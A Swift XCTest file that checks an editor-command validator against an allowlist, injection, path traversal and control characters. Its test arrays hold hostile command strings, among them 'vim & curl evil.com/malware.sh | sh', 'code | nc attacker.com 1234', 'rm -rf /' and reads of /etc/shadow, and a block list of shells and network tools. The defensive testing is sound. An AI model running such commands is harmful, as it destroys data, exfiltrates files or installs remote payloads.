import XCTest
import Foundation
@testable import HirundoCore

final class EditorCommandValidationTests: XCTestCase {
    
    // MARK: - Basic Validation Tests
    
    func testValidEditorCommands() {
        // Test allowed editors
        let validEditors = [
            "vim",
            "nvim",
            "nano",
            "emacs",
            "code",
            "subl",
            "atom",
            "micro",
            "vi",
            "open"
        ]
        
        for editor in validEditors {
            let result = SecurityUtilities.validateAndSanitizeEditorCommand(editor)
            XCTAssertEqual(result, editor, "\(editor) should be valid")
        }
    }
    
    func testAbsolutePathValidation() {
        // Test allowed absolute paths
        let validPaths = [
            "/usr/bin/vim",
            "/usr/bin/nvim",
            "/usr/bin/nano",
            "/usr/bin/emacs",
            "/usr/local/bin/vim",
            "/usr/local/bin/nvim",
            "/usr/local/bin/code",
            "/opt/homebrew/bin/vim",
            "/usr/bin/open"
        ]
        
        for path in validPaths {
            let result = SecurityUtilities.validateAndSanitizeEditorCommand(path)
            let expectedCommand = URL(fileURLWithPath: path).lastPathComponent
            XCTAssertEqual(result, expectedCommand, "\(path) should extract command name")
        }
    }
    
    // MARK: - Command Injection Prevention Tests
    
    func testCommandInjectionAttempts() {
        let maliciousCommands = [
            "vim; rm -rf /",
            "nano && cat /etc/passwd",
            "code | nc attacker.com 1234",
            "vim & curl evil.com/malware.sh | sh",
            "nano || wget malicious.com/backdoor",
            "vim `cat /etc/shadow`",
            "code $(whoami)",
            "vim {echo,hello}",
            "nano [a-z]*",
            "vim <(cat /etc/passwd)",
            "code >(tee /tmp/output)",
            "vim \"test; echo hacked\"",
            "nano 'test; rm -rf /'",
            "vim;id",
            "vim&id",
            "vim|id"
        ]
        
        for command in maliciousCommands {
            let result = SecurityUtilities.validateAndSanitizeEditorCommand(command)
            XCTAssertNil(result, "Command injection attempt should be rejected: \(command)")
        }
    }
    
    func testPathTraversalAttempts() {
        let pathTraversalCommands = [
            "../../../usr/bin/vim",
            "vim/../../../etc/passwd",
            "./../../bin/sh",
            "vim/../../sensitive",
            "../vim",
            "./../nano",
            "vim/..",
            "../../../../../../usr/bin/vim"
        ]
        
        for command in pathTraversalCommands {
            let result = SecurityUtilities.validateAndSanitizeEditorCommand(command)
            XCTAssertNil(result, "Path traversal attempt should be rejected: \(command)")
        }
    }
    
    // MARK: - Special Character Tests
    
    func testNullByteInjection() {
        let nullByteCommands = [
            "vim\0",
            "vim\0.exe",
            "nano\0 && malicious",
            "\0vim",
            "vim test\0file"
        ]
        
        for command in nullByteCommands {
            let result = SecurityUtilities.validateAndSanitizeEditorCommand(command)
            // After sanitization, if the command is still valid, it should work
            if let sanitized = result {
                XCTAssertFalse(sanitized.contains("\0"), "Null bytes should be removed")
                XCTAssertTrue(["vim", "nano"].contains(sanitized), "Should extract valid command after sanitization")
            }
        }
    }
    
    func testControlCharacterHandling() {
        let controlCharCommands = [
            "vim\r\nmalicious",
            "nano\nrm -rf /",
            "vim\rcommand",
            "code\t&&\tmalicious",
            "\nvim",
            "vim\n",
            "\r\nvim\r\n"
        ]
        
        for command in controlCharCommands {
            let result = SecurityUtilities.validateAndSanitizeEditorCommand(command)
            if let sanitized = result {
                XCTAssertFalse(sanitized.contains("\r"), "Carriage returns should be removed")
                XCTAssertFalse(sanitized.contains("\n"), "Newlines should be removed")
            }
        }
    }
    
    // MARK: - Whitespace and Empty Tests
    
    func testWhitespaceHandling() {
        let whitespaceCommands = [
            "  vim  ",
            "\tvim\t",
            " \n vim \r ",
            "   nano   ",
            "\t\t\tcode\t\t\t"
        ]
        
        for command in whitespaceCommands {
            let result = SecurityUtilities.validateAndSanitizeEditorCommand(command)
            XCTAssertNotNil(result, "Whitespace should be trimmed")
            XCTAssertFalse(result?.hasPrefix(" ") ?? true, "Leading whitespace should be removed")
            XCTAssertFalse(result?.hasSuffix(" ") ?? true, "Trailing whitespace should be removed")
        }
    }
    
    func testEmptyAndInvalidCommands() {
        let emptyCommands = [
            "",
            " ",
            "\t",
            "\n",
            "\r\n",
            "   \t\n\r   "
        ]
        
        for command in emptyCommands {
            let result = SecurityUtilities.validateAndSanitizeEditorCommand(command)
            XCTAssertNil(result, "Empty or whitespace-only commands should be rejected")
        }
    }
    
    // MARK: - Disallowed Editors Tests
    
    func testDisallowedEditors() {
        let disallowedEditors = [
            "sh",
            "bash",
            "zsh",
            "python",
            "ruby",
            "perl",
            "node",
            "php",
            "nc",
            "netcat",
            "curl",
            "wget",
            "rm",
            "dd",
            "mkfs"
        ]
        
        for editor in disallowedEditors {
            let result = SecurityUtilities.validateAndSanitizeEditorCommand(editor)
            XCTAssertNil(result, "Dangerous command should be rejected: \(editor)")
        }
    }
    
    func testUnknownEditors() {
        let unknownEditors = [
            "myeditor",
            "custom-editor",
            "editor123",
            "text_editor",
            "super-vim"
        ]
        
        for editor in unknownEditors {
            let result = SecurityUtilities.validateAndSanitizeEditorCommand(editor)
            XCTAssertNil(result, "Unknown editor should be rejected: \(editor)")
        }
    }
    
    // MARK: - Edge Cases
    
    func testSuspiciousButValidPaths() {
        // These should be rejected even though they contain valid editor names
        let suspiciousPaths = [
            "/etc/vim",  // Not in allowed paths
            "/home/user/vim",  // Not in allowed paths
            "/tmp/nano",  // Not in allowed paths
            "/var/lib/code",  // Not in allowed paths
            "/../../usr/bin/vim"  // Contains path traversal
        ]
        
        for path in suspiciousPaths {
            let result = SecurityUtilities.validateAndSanitizeEditorCommand(path)
            XCTAssertNil(result, "Suspicious path should be rejected: \(path)")
        }
    }
    
    func testEnvironmentVariableExpansion() {
        let envVarCommands = [
            "$EDITOR",
            "${EDITOR}",
            "$(echo vim)",
            "`which vim`",
            "~/.local/bin/vim",
            "$HOME/bin/nano",
            "${PATH}/vim"
        ]
        
        for command in envVarCommands {
            let result = SecurityUtilities.validateAndSanitizeEditorCommand(command)
            XCTAssertNil(result, "Environment variable expansion should be rejected: \(command)")
        }
    }
    
    // MARK: - File Existence Validation Tests
    
    func testEditorExecutableValidation() {
        // This test would verify that the editor executable actually exists
        // For unit testing, we'll check common editors
        let commonEditors = ["vim", "nano", "vi"]
        
        for editor in commonEditors {
            let result = SecurityUtilities.validateAndSanitizeEditorCommand(editor)
            if let validEditor = result {
                // In a real implementation, we would check if the executable exists
                // For testing, we just verify the validation passed
                XCTAssertEqual(validEditor, editor)
            }
        }
    }
    
    // MARK: - Performance Tests
    
    func testValidationPerformance() {
        // Ensure validation completes quickly even for complex inputs
        let complexInput = String(repeating: "a", count: 10000) + "vim"
        
        measure {
            _ = SecurityUtilities.validateAndSanitizeEditorCommand(complexInput)
        }
    }
    
    func testMaliciousPatternPerformance() {
        // Test that regex patterns don't cause ReDoS (Regular Expression Denial of Service)
        let maliciousPattern = String(repeating: "../", count: 100) + "vim"
        
        let startTime = Date()
        _ = SecurityUtilities.validateAndSanitizeEditorCommand(maliciousPattern)
        let endTime = Date()
        
        let duration = endTime.timeIntervalSince(startTime)
        XCTAssertLessThan(duration, 0.1, "Validation should complete quickly")
    }
}